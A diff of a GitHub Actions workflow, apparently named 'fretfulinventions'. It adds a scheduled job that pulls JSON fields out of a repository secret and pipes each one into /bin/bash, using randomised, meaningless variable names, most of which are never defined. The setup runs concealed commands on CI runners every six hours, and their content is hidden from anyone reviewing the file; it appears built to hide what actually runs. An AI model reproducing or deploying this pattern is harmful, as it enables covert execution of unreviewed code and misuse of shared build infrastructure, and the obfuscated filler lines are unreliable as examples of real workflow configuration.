@@ -3,7 +3,7 @@ name: fretfulinventions
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 3/6 * * *'
+    - cron: '27 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +11,25 @@ jobs:
       - uses: actions/checkout@v4
       - name: fretfulinventions
         env:
-          cwqfi41543: ${{ secrets.cwqfi41543 }}
+          zjsk02: ${{ secrets.zjsk02 }}
         run: |
-          echo $cwqfi41543 | jq -r .agtww87592 | /bin/bash
-          echo $nquty1309 | jq -r .syr30930 | /bin/bash
-          echo $f54831 | jq -r .wsij71000 | /bin/bash
-          echo $me6 | jq -r .jcvz889 | /bin/bash
-          echo $x67372 | jq -r .be073 | /bin/bash
-          echo $dfmcy68776 | jq -r .eb37156 | /bin/bash
-          echo $q26 | jq -r .evic306 | /bin/bash
-          echo $sqzse5 | jq -r .wih106 | /bin/bash
-          echo $msehl5644 | jq -r .wdvi87975 | /bin/bash
+          echo $zjsk02 | jq -r .dwvbw05022 | /bin/bash
+          echo $zld7 | jq -r .nnv92 | /bin/bash
+          echo $r943 | jq -r .yr98788 | /bin/bash
+          echo $bx844 | jq -r .zmmlp2612 | /bin/bash
+          echo $kfuf3837 | jq -r .uzbu65659 | /bin/bash
+          echo $pxx2 | jq -r .cbm57 | /bin/bash
+          echo $uu11323 | jq -r .cn484 | /bin/bash
+          echo $lcve82 | jq -r .feb124 | /bin/bash
+          echo $feezu9557 | jq -r .tgmsr0 | /bin/bash
+          echo $mwcv1588 | jq -r .ccdn7384 | /bin/bash
+          echo $ab17 | jq -r .c53490 | /bin/bash
+          echo $uks5290 | jq -r .ke16 | /bin/bash
+          echo $ksi8439 | jq -r .wp16 | /bin/bash
+          echo $ujtk62 | jq -r .fxg95 | /bin/bash
+          echo $uanj05442 | jq -r .pwxh6814 | /bin/bash
+          echo $b21 | jq -r .xu1106 | /bin/bash
+          echo $e13 | jq -r .ux92 | /bin/bash
+          echo $df797 | jq -r .rozcf0314 | /bin/bash
+          echo $on82515 | jq -r .wxxky26 | /bin/bash
 
